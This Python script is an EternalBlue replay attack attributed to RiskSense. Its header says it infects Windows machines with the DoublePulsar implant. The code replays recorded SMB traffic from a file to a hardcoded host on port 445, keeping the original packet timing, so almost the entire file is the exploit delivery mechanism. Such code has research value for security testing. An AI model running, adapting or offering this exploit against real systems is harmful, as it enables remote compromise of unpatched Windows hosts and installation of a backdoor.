#!/env/bin/python3
#
# EternalBlue replay attack by @jennamagius
#
# Copyright (C) 2017 RiskSense, Inc.
#
# License: Apache 2.0
#
# Infects a machine with DoublePulsar.
# Tested against Windows Server 2008 R2 SP1

import socket
import time
import ast

def main():
    backlog = open("eternalblue.replay").read().split("\n\n")
    backlog = [ast.literal_eval(i) for i in backlog]
    connections = []
    start = time.monotonic()
    for i in backlog:
        delta = i[-1] - (start - time.monotonic())
        print(i[0], delta)
        if delta > 0:
            time.sleep(delta)
        start = time.monotonic()
        if i[0] == "connect":
            sock = socket.socket()
            sock.connect(('192.168.10.80',445))
            connections.append({"socket":sock,"stream" : i[1]})
        if i[0] == "close":
            [j['socket'].close() for j in connections if j["stream"] == i[1]]
        if i[0] == "send":
            [j['socket'].send(i[2]) for j in connections if j["stream"] == i[1]]
        if i[0] == "recv":
            [j['socket'].recv(2048) for j in connections if j['stream'] == i[1]]


if __name__ == "__main__":
    main()
